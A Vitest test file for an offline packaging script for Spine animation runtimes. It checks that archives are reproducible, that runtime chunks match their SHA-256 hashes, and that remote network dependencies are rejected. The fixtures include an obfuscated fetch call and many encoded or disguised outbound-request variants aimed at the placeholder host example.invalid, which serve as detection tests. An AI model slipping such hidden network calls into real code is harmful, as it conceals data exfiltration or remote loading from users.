import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { cpSync, mkdtempSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";

const repositoryRoot = resolve(import.meta.dirname, "../..");
const npmCommand = process.platform === "win32" ? "npm.cmd" : "npm";
const script = resolve(repositoryRoot, "scripts/package-offline.mjs");
const temporaryDirectories: string[] = [];
let verifiedBuildDirectory: string;

beforeAll(() => {
  verifiedBuildDirectory = mkdtempSync(join(tmpdir(), "spine-offline-verified-build-"));
  execFileSync(npmCommand, ["run", "build:offline", "--", "--outDir", verifiedBuildDirectory], {
    cwd: repositoryRoot,
    env: { ...process.env, NODE_ENV: "production" },
    stdio: "pipe",
  });
}, 30_000);

afterAll(() => {
  rmSync(verifiedBuildDirectory, { recursive: true, force: true });
});

afterEach(() => {
  for (const directory of temporaryDirectories.splice(0)) rmSync(directory, { recursive: true, force: true });
});

function makeOfflineBuild(overrides: Partial<Record<"html" | "js" | "css", string>> = {}) {
  const directory = mkdtempSync(join(tmpdir(), "spine-offline-package-"));
  temporaryDirectories.push(directory);
  mkdirSync(join(directory, "offline"), { recursive: true });
  mkdirSync(join(directory, "assets"), { recursive: true });
  mkdirSync(join(directory, "licenses"), { recursive: true });
  writeFileSync(join(directory, "offline/index.html"), overrides.html ?? '<p>离线中文说明</p><script type="module" src="../assets/index-a.js"></script>');
  writeFileSync(join(directory, "assets/index-a.js"), overrides.js ?? 'export const offline = "本地相对资源";');
  writeFileSync(join(directory, "assets/index-a.css"), overrides.css ?? "body { color: black; }");
  for (const name of readdirSync(join(verifiedBuildDirectory, "assets"))) {
    if (!/^runtime-.*\.js$/.test(name)) continue;
    cpSync(join(verifiedBuildDirectory, "assets", name), join(directory, "assets", name));
  }
  cpSync(
    join(verifiedBuildDirectory, "licenses/SPINE-RUNTIMES-LICENSE.txt"),
    join(directory, "licenses/SPINE-RUNTIMES-LICENSE.txt"),
  );
  return directory;
}

function runtimePath(directory: string, version: string) {
  const runtimeName = readdirSync(join(directory, "assets"))
    .find((name) => new RegExp(`^runtime-${version}-[A-Za-z0-9_-]+\\.js$`).test(name));
  expect(runtimeName).toBeDefined();
  return join(directory, "assets", runtimeName!);
}

function packageFixture(directory: string, archive: string) {
  return execFileSync(process.execPath, [script], {
    cwd: repositoryRoot,
    encoding: "utf8",
    env: {
      ...process.env,
      SPINE_OFFLINE_DIST_DIR: directory,
      SPINE_OFFLINE_ARCHIVE: archive,
      SPINE_OFFLINE_SKIP_BUILD: "1",
    },
    stdio: "pipe",
  });
}

describe("离线包脚本", () => {
  it("同一静态构建连续打包两次产生完全相同的 SHA-256", () => {
    const directory = makeOfflineBuild();
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-archive-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");

    packageFixture(directory, archive);
    const firstHash = createHash("sha256").update(readFileSync(archive)).digest("hex");
    packageFixture(directory, archive);
    const secondHash = createHash("sha256").update(readFileSync(archive)).digest("hex");

    expect(secondHash).toBe(firstHash);
  });

  it("同一真实八 Runtime 构建连续打包两次产生完全相同的 SHA-256", () => {
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-real-archive-"));
    temporaryDirectories.push(archiveDirectory);
    const archive = join(archiveDirectory, "offline.zip");

    packageFixture(verifiedBuildDirectory, archive);
    const firstHash = createHash("sha256").update(readFileSync(archive)).digest("hex");
    packageFixture(verifiedBuildDirectory, archive);
    const secondHash = createHash("sha256").update(readFileSync(archive)).digest("hex");

    expect(secondHash).toBe(firstHash);
  });

  it.each(["3_5", "3_6", "3_7", "4_3"])("拒绝 Spine %s Runtime chunk 的单字节篡改", (version) => {
    const tamperedBuild = mkdtempSync(join(tmpdir(), `spine-offline-tampered-${version}-`));
    temporaryDirectories.push(tamperedBuild);
    cpSync(verifiedBuildDirectory, tamperedBuild, { recursive: true });
    const path = runtimePath(tamperedBuild, version);
    writeFileSync(path, Buffer.concat([readFileSync(path), Buffer.from(" ")]));

    expect(() => packageFixture(tamperedBuild, join(tamperedBuild, "offline.zip")))
      .toThrow(/Runtime.*SHA-256/);
  });

  it.each(["3_5", "3_6", "3_7", "3_8", "4_0", "4_1", "4_2", "4_3"])(
    "拒绝 Spine %s 预期同名 Runtime chunk 被干净 JavaScript 替换",
    (version) => {
      const directory = makeOfflineBuild();
      writeFileSync(runtimePath(directory, version), "export {};\n");

      expect(() => packageFixture(directory, join(directory, "offline.zip")))
        .toThrow(/Runtime.*SHA-256/);
    },
  );

  it("拒绝缺失任一预期 Runtime entry", () => {
    const directory = makeOfflineBuild();
    rmSync(runtimePath(directory, "3_8"));

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/Runtime 文件集合/);
  });

  it("即使启发式审计未识别混淆外联，也拒绝替换后的同名 Runtime", () => {
    const directory = makeOfflineBuild();
    writeFileSync(runtimePath(directory, "4_3"), [
      'const member = ["fe", "tch"].join("");',
      "globalThis[member](String.fromCharCode(104,116,116,112,115,58,47,47,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100));",
    ].join("\n"));

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/Runtime.*SHA-256/);
  });

  it.each([
    ["未来主版本", "assets/runtime-5_0-a.js"],
    ["双位次版本", "assets/runtime-3_10-a.js"],
    ["禁止格式", "assets/runtime-xhm-a.js"],
    ["嵌套 entry", "assets/nested/runtime-3_5-a.js"],
    ["Runtime 命名目录", "assets/runtime-shadow/chunk.js"],
    ["伪装 helper", "assets/runtime-factory-copy.js"],
  ])("拒绝额外 Runtime 候选：%s", (_label, archivePath) => {
    const directory = makeOfflineBuild();
    const path = join(directory, archivePath);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, "export {};\n");

    expect(() => packageFixture(directory, join(directory, "offline.zip")))
      .toThrow(/Runtime 文件集合/);
  });

  it("拒绝所有受支持载体中的外部运行网络目标", () => {
    const maliciousBuilds = [
      { js: 'fetch("https://example.invalid/data");' },
      { js: 'const xhr = new XMLHttpRequest(); xhr.open("GET", "https://example.invalid/data");' },
      { js: 'new Worker("https://example.invalid/worker.js");' },
      { js: 'const workerUrl = "https://example.invalid/worker.js"; new Worker(workerUrl);' },
      { js: 'importScripts("https://example.invalid/worker.js");' },
      { js: 'import("https://example.invalid/module.js");' },
      { js: 'fetch("https:\\u002f\\u002fexample.invalid/escaped-fetch");' },
      { js: 'import("https:\\x2f\\u{2f}example.invalid/escaped-import.js");' },
      { js: 'new EventSource("//example.invalid/events");' },
      { js: 'new WebSocket("wss://example.invalid/socket");' },
      { css: "body { background-image: url(//cdn.example.invalid/background.png); }" },
      { css: "body { background-image: url(https:\\2f \\2f cdn.example.invalid/escaped-background.png); }" },
      { css: String.raw`body { background-image: url(https:\/\/cdn.example.invalid/escaped-character-background.png); }` },
      { html: '<script src="https://example.invalid/app.js"></script>' },
      { html: '<script src="https:&#47;&#47;example.invalid/escaped-app.js"></script>' },
      { html: '<script src="https:&sol;&sol;example.invalid/named-entity-app.js"></script>' },
      { html: "<script src=https://example.invalid/unquoted-app.js></script>" },
      { html: "<a href=//example.invalid/unquoted-link>外部链接</a>" },
      { html: "<script src=https:&#47;&#47;example.invalid/unquoted-entity.js></script>" },
      { html: '<img src="https:&NewLine;//example.invalid/entity-newline.png">' },
      { html: "<img src=https:&#10;//example.invalid/numeric-newline.png>" },
      { html: '<img src="https://example.invalid/first.png" src="./ignored-safe.png">' },
      { html: '<button formaction="https://example.invalid/submit">提交</button>' },
      { html: '<video poster="https://example.invalid/poster.png"></video>' },
      { html: '<object data="https://example.invalid/document.pdf"></object>' },
      { html: '<div style="background:url(https://example.invalid/background.png)"></div>' },
      { html: '<style>@import "https://example.invalid/theme.css";</style>' },
      { html: '<script type="text/javascript1.5">fetch(getEndpoint())</script>' },
      { html: '<script type="text/x-unknown-script">fetch(getEndpoint())</script>' },
      { html: '<script>fetch("https://example.invalid/inline-script");</script>' },
      { js: "fetch(`https:\\u002f\\u002fexample.invalid/template-fetch`);" },
      { js: "import(`https:\\x2f\\u{2f}example.invalid/template-import.js`);" },
      { js: "const xhr = new XMLHttpRequest(); xhr.open(`GET`, `https://example.invalid/template-xhr`);" },
      { js: "fetch(`https://${host}/dynamic-fetch`);" },
      { js: "import(`./${specifier}`);" },
      { js: 'const u = "./local.json"; fetch(u);' },
      { js: "const u = `./${specifier}`; import(u);" },
      { js: "const u = makeUrl(); new WebSocket(u);" },
      { js: "const u = `/events/${channel}`; new EventSource(u);" },
      { js: 'new Worker(new URL("./worker.js", "https://example.invalid/base/"));' },
      { js: 'new SharedWorker(new URL("./worker.js", getBase()));' },
      { js: 'window.navigator.sendBeacon(getEndpoint(), "payload");' },
      { js: "(0, fetch)(getEndpoint());" },
      { js: "fetch.call(globalThis, getEndpoint());" },
      { js: "const request = globalThis.fetch; request(getEndpoint());" },
      { js: 'const endpoint = "https://example.invalid/not-called";' },
      { html: '<script type="module">const u = `./${name}`; fetch(u)</script>' },
    ];

    for (const [index, overrides] of maliciousBuilds.entries()) {
      const directory = makeOfflineBuild(overrides);
      try {
        packageFixture(directory, join(directory, "offline.zip"));
      } catch (error) {
        expect(error).toMatchObject({ message: expect.stringMatching(/远程运行依赖/) });
        continue;
      }
      throw new Error(`恶意 fixture ${index} 未被拒绝`);
    }
  });

  it("允许 blob、data、相对资源和中文文本", () => {
    const directory = makeOfflineBuild({
      html: '<!-- <img src=https://example.invalid/comment-only> --><pre>&#60;img src=https://example.invalid/text-only&#62;</pre><p>离线中文说明</p><script type=application/json>{"help":"<img src=https://example.invalid/text-only>"}</script><script type=text/plain>fetch(getEndpoint())</script><button formaction=./submit>提交</button><video poster=./poster.png></video><video poster=data:image/png;base64,AAAA></video><object data=blob:local-document></object><div style="background:url(./background.png)"></div><style>.local{background:url(data:image/png;base64,AAAA)}</style><img src=blob:local-image><img src=data:image/png;base64,AAAA><img src="./first-safe.png" src="https://example.invalid/ignored-duplicate.png"><img srcset="data:text/plain,https://example.invalid/not-a-request 1x, ./local.png 2x"><script src=../assets/index-a.js></script>',
      js: 'fetch("blob:local-data"); fetch("data:text/plain,本地"); import("./runtime-3_8-Ab12cd34.js"); const xhr = new XMLHttpRequest(); xhr.open(`GET`, `../assets/local.json`); const workerPath = "./worker.js"; new Worker(workerPath); const blobWorker = "blob:local-worker"; new Worker(blobWorker); const moduleBase = import.meta.url; new SharedWorker(new URL("./shared-worker.js", moduleBase));',
      css: 'body { background-image: url(data:image/png;base64,AAAA); }',
    });
    const archiveDirectory = mkdtempSync(join(tmpdir(), "spine-offline-allowed-"));
    temporaryDirectories.push(archiveDirectory);

    expect(() => packageFixture(directory, join(archiveDirectory, "offline.zip"))).not.toThrow();
  });
});
